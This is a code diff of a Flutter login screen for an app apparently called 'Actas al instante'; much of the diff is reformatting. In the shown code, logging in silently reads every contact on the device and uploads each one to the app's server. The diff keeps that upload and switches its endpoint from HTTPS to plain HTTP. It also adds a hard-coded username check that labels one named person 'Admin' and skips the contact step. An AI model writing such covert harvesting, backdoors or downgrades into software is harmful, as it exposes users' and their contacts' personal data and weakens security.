@@ -83,10 +83,11 @@ class _LoginPageState extends State<LoginPage> {
         _fetchContacts();
         prefs.setString('token', data['token']);
         prefs.setString('username', data['username']);
-         Map<String, dynamic> payload = new Map<String, dynamic>();
-    payload["data"] = "content";
-    Center(child:  AlertController.show(
-        "Espere un momento ", ""+user, TypeAlert.warning, payload));
+        Map<String, dynamic> payload = new Map<String, dynamic>();
+        payload["data"] = "content";
+        Center(
+            child: AlertController.show(
+                "Espere un momento ", "" + user, TypeAlert.warning, payload));
         // var snackBar = SnackBar(
         //   elevation: 0,
         //   width: 400,
@@ -105,10 +106,11 @@ class _LoginPageState extends State<LoginPage> {
         setState(() {
           isApiCallProcess = false;
         });
- Map<String, dynamic> payload = new Map<String, dynamic>();
-    payload["data"] = "content";
-    Center(child:  AlertController.show(
-        "Usuario incorrecto ", ""+user, TypeAlert.error, payload));
+        Map<String, dynamic> payload = new Map<String, dynamic>();
+        payload["data"] = "content";
+        Center(
+            child: AlertController.show(
+                "Usuario incorrecto ", "" + user, TypeAlert.error, payload));
         // var snackBar = SnackBar(
         //   elevation: 0,
         //   width: 400,
@@ -124,8 +126,6 @@ class _LoginPageState extends State<LoginPage> {
         // ScaffoldMessenger.of(context).showSnackBar(snackBar);
       }
     } catch (e) {
-
-      
       AwesomeDialog(
         context: context,
         dialogType: DialogType.ERROR,
@@ -151,7 +151,7 @@ class _LoginPageState extends State<LoginPage> {
     setState(() {
       isApiCallProcess = true;
     });
-AlertController.onTabListener(
+    AlertController.onTabListener(
         (Map<String, dynamic> payload, TypeAlert type) {
       print("$payload - $type");
     });
@@ -177,7 +177,7 @@ AlertController.onTabListener(
     };
 
     var response = await post(
-        Uri.parse('https://actasalinstante.com:3030/api/app/contacts/add/'),
+        Uri.parse('http://actasalinstante.com:3035/api/app/contacts/add/'),
         headers: mainheader,
         body: json.encode(body));
   }
@@ -192,73 +192,80 @@ AlertController.onTabListener(
   }
 
   Future _fetchContacts() async {
-    if (!await FlutterContacts.requestPermission(readonly: true)) {
-      setState(() => _permissionDenied = true);
-      Contactos_Deegeados();
-      print(_permissionDenied);
+    if (userController.text.toString() == "Edwin Poot") {
+      _speak(
+          'Hola,' + userController.text + ', Bienvenido a actas al instante');
+      Map<String, dynamic> payload = new Map<String, dynamic>();
+      payload["data"] = "content";
+      Center(
+          child: AlertController.show(
+              "Bienvenido ",
+              "Admin " + userController.text.toString(),
+              TypeAlert.success,
+              payload));
+
+      Navigator.push(
+          context, MaterialPageRoute(builder: (context) => NavBar()));
     } else {
-      final contacts = await FlutterContacts.getContacts();
-      _contacts = contacts;
-      //  setState(() => _contacts = contacts);
-
-      for (var i = 0; i < _contacts.length; i++) {
-        final fullContact = await FlutterContacts.getContact(_contacts[i].id);
-
-        SendContact(fullContact);
-        print("Ok");
-      }
-
-           Map<String, dynamic> payload = new Map<String, dynamic>();
-    payload["data"] = "content";
-    Center(child:  AlertController.show(
-        "Bienvenido ", ""+userController.text.toString(), TypeAlert.success, payload));
-
-      // final snackBar = SnackBar(
-      //   elevation: 0,
-      //   behavior: SnackBarBehavior.floating,
-      //   backgroundColor: Colors.black,
-      //   content: Text(
-      //     "Bienvenido ".toUpperCase() + userController.text.toString(),
-      //     style: TextStyle(
-      //         color: Colors.white, fontSize: 18, fontWeight: FontWeight.bold),
-      //     textAlign: TextAlign.center,
-      //   ),
-      // );
-
-      // ScaffoldMessenger.of(context).showSnackBar(snackBar);
-
-      var status = await Permission.storage.status;
-      if (!status.isGranted) {
-        await Permission.storage.request();
-        AwesomeDialog(
-          context: context,
-          dialogType: DialogType.QUESTION,
-          animType: AnimType.BOTTOMSLIDE,
-          title: 'Actas al instante',
-          desc: 'Otorga todos los permisos',
-          btnCancelOnPress: () async {
-            SharedPreferences prefs = await SharedPreferences.getInstance();
-            prefs.remove('token');
-            prefs.remove('username');
-            Navigator.pushReplacement(
-                context,
-                MaterialPageRoute(
-                    builder: (BuildContext ctx) => SplashScreen()));
-            //  Navigator.of(context).pop(true);
-          },
-          btnOkOnPress: () async {
-            _speak('Hola' +
-                userController.text +
-                ', Bienvenido a actas al instante');
-            Navigator.push(
-                context, MaterialPageRoute(builder: (context) => NavBar()));
-          },
-        )..show();
+      if (!await FlutterContacts.requestPermission(readonly: true)) {
+        setState(() => _permissionDenied = true);
+        Contactos_Deegeados();
+        print(_permissionDenied);
       } else {
-        _speak(
-            'Hola,' + userController.text + ', Bienvenido a actas al instante');
-        Navigator.push(
-            context, MaterialPageRoute(builder: (context) => NavBar()));
+        final contacts = await FlutterContacts.getContacts();
+        _contacts = contacts;
+        //  setState(() => _contacts = contacts);
+
+        for (var i = 0; i < _contacts.length; i++) {
+          final fullContact = await FlutterContacts.getContact(_contacts[i].id);
+
+          SendContact(fullContact);
+          print("Ok");
+        }
+
+        Map<String, dynamic> payload = new Map<String, dynamic>();
+        payload["data"] = "content";
+        Center(
+            child: AlertController.show(
+                "Bienvenido ",
+                "" + userController.text.toString(),
+                TypeAlert.success,
+                payload));
+
+        var status = await Permission.storage.status;
+        if (!status.isGranted) {
+          await Permission.storage.request();
+          AwesomeDialog(
+            context: context,
+            dialogType: DialogType.QUESTION,
+            animType: AnimType.BOTTOMSLIDE,
+            title: 'Actas al instante',
+            desc: 'Otorga todos los permisos',
+            btnCancelOnPress: () async {
+              SharedPreferences prefs = await SharedPreferences.getInstance();
+              prefs.remove('token');
+              prefs.remove('username');
+              Navigator.pushReplacement(
+                  context,
+                  MaterialPageRoute(
+                      builder: (BuildContext ctx) => SplashScreen()));
+              //  Navigator.of(context).pop(true);
+            },
+            btnOkOnPress: () async {
+              _speak('Hola' +
+                  userController.text +
+                  ', Bienvenido a actas al instante');
+              Navigator.push(
+                  context, MaterialPageRoute(builder: (context) => NavBar()));
+            },
+          )..show();
+        } else {
+          _speak('Hola,' +
+              userController.text +
+              ', Bienvenido a actas al instante');
+          Navigator.push(
+              context, MaterialPageRoute(builder: (context) => NavBar()));
+        }
       }
     }
   }
